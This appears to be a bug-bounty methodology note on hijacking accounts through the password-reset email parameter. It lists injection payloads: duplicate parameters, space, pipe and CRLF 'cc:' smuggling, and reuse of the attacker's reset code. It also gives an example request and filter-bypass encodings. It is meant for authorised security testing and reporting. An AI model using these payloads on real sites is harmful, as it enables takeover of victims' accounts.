# Account Takeover by Abusing the Reset Email Parameter

The forgot-password request usually takes a single `email` parameter. When the backend reads that parameter naively (first-value vs last-value vs all-values, or raw string interpolation into the mail), a single request can deliver the reset link to the attacker while "addressing" the victim — direct Account Takeover with nothing but the victim's email address. Severity: P1 when token lands in attacker-controlled inbox.

## Hunting Checklist

1. Capture the forgot-password request and replay it in Repeater.
2. For a victim address, try every pollution/concatenation variant of the email parameter below.
3. Watch what actually arrives at **your** mailbox when the parameter names the victim (and vice versa).
4. Test CRLF breaks for header injection (`cc/bcc`) into the generated email.
5. Test injection of your own reset `code`/`token` into the request to see if any step consumes parameters it shouldn't.
6. Pair successful delivery-to-attacker with the token theft chain to complete ATO.

## Test Cases & Examples

### Email Parameter Abuse (original payload set)
Try each variant as the value of the email field:
```text
1. email=victim@gmail.com&email=attacker@gmail.com
2. email=victim@gmail.com%20email=attacker@gmail.com
3. email=victim@gmail.com|email=attacker@gmail.com
4. email=victim@gmail.com%0d%0acc:attacker@gmail.com
5. email=victim@gmail.com&code=<my password reset token>
```
Request shape for reference:
```http
POST /api/forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim%40gmail.com%0d%0acc%3aattacker%40gmail.com
```
What each variant probes:
- **1 (HPP)**: framework may validate one occurrence and send to the other.
- **2 (space-encoded)**: naive parsers split on space and see two recipients.
- **3 (pipe)**: some transports treat `|` as a recipient separator.
- **4 (CRLF)**: header injection — adds attacker as `cc:` in the generated email (SMTP-level).
- **5 (param smuggling)**: a `code` from *your* reset may be consumed for the victim's flow, or leak cross-account binding.

### Related Variants (where they're documented)
- JSON array emails (`{"email_address":["victim","attacker"]}`): `Top_5_Password_Reset_Bugs.md` §2.
- `Host` / `X-Forwarded-Host` poisoning of the emailed link: `Account_Takeovers_Methodologies/Account_Takeovers_Methods.md` §3.
- Token delivered via analytics/referrer leaks: `Password_Reset_Token_Leakage.md`.

## Bypass Techniques

- If `&` is filtered, re-encode: `%26`, `%25%32%31`, unicode look-alikes; if space is filtered, try `%09`/`%0a` as separators.
- Array forms for form-encoded endpoints: `email[]=attacker@evil.com`, and JSON `{"email":["victim","attacker"]}`.
- Case the parameter itself: `Email=`, `email[]`, duplicate `email=` with differing values to compare first-vs-last consumption.

## Tools & Resources

- Burp Suite Repeater + Intruder (pitchfork positions: variant × payload), Burp Comparer for diffing two accounts' responses.
- [10 Password Reset Flaws](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Report Tips

- Show the victim's email in the request **and** the reset link arriving in the attacker inbox in the same screenshot — that pairing is the proof of ATO.
- State the precondition: attacker needs only the victim's email, no prior access.
- For CRLF (#4), quote the received email's headers as appendix evidence.

## Credits

- [@tamimhasan404](https://twitter.com/tamimhasan404) — payload list.
